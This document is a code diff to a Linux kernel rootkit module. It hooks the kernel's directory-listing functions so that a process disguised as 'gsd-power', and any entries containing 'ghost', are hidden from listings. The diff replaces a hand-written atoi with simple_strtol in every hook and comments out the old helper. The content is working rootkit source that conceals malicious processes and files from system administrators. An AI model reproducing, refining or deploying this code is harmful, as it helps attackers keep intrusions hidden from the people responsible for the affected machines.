@@ -26,21 +26,21 @@ const char *hide = "gsd-power";
 int hidden_pid=-1;
 int protected_pid=-1;
 
-static int adore_atoi(const char *str)
-{
-        int ret = 0, mul = 1;
-        const char *ptr;
-        for (ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++);
-        ptr--;
-        while (ptr >= str) {
-                if (*ptr < '0' || *ptr > '9')
-                        break;
-                ret += (*ptr - '0') * mul;
-                mul *= 10;
-		ptr--;   
-        }
-        return ret;
-}
+// static int adore_atoi(const char *str)
+// {
+//         int ret = 0, mul = 1;
+//         const char *ptr;
+//         for (ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++);
+//         ptr--;
+//         while (ptr >= str) {
+//                 if (*ptr < '0' || *ptr > '9')
+//                         break;
+//                 ret += (*ptr - '0') * mul;
+//                 mul *= 10;
+// 		ptr--;   
+//         }
+//         return ret;
+// }
 
 static int print_pid(void)
 {
@@ -83,7 +83,7 @@ static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t of
 	int ret = 0;
 	hidden_pid=find_pid(hide);
 	pid = simple_strtol(name, &endp, 10);
-	if (adore_atoi(name)!=hidden_pid && !strstr(name, "ghost"))
+	if (pid!=hidden_pid && !strstr(name, "ghost"))
 		ret = KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
@@ -96,7 +96,7 @@ static int khook_filldir(void *__buf, const char *name, int namlen, loff_t offse
 	int ret = 0;
 	hidden_pid=find_pid(hide);
 	pid = simple_strtol(name, &endp, 10);
-	if (adore_atoi(name) != hidden_pid && !strstr(name, "ghost"))
+	if (pid != hidden_pid && !strstr(name, "ghost"))
 		ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
@@ -110,7 +110,7 @@ static int khook_filldir64(void *__buf, const char *name, int namlen,
 	int ret = 0;
 	hidden_pid=find_pid(hide);
 	pid = simple_strtol(name, &endp, 10);
-	if (adore_atoi(name) != hidden_pid && !strstr(name, "ghost"))
+	if (pid != hidden_pid && !strstr(name, "ghost"))
 		ret = KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
@@ -124,7 +124,7 @@ static int khook_compat_fillonedir(void *__buf, const char *name, int namlen,
 	int ret = 0;
 	hidden_pid=find_pid(hide);
 	pid = simple_strtol(name, &endp, 10);
-	if (adore_atoi(name) != hidden_pid && !strstr(name, "ghost"))
+	if (pid != hidden_pid && !strstr(name, "ghost"))
 		ret = KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
@@ -139,7 +139,7 @@ static int khook_compat_filldir64(void *__buf, const char *name, int namlen,
 	int ret = 0;
 	hidden_pid=find_pid(hide);
 	pid = simple_strtol(name, &endp, 10);
-	if (adore_atoi(name) != hidden_pid && !strstr(name, "ghost"))
+	if (pid != hidden_pid && !strstr(name, "ghost"))
 		ret = KHOOK_ORIGIN(compat_filldir64, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
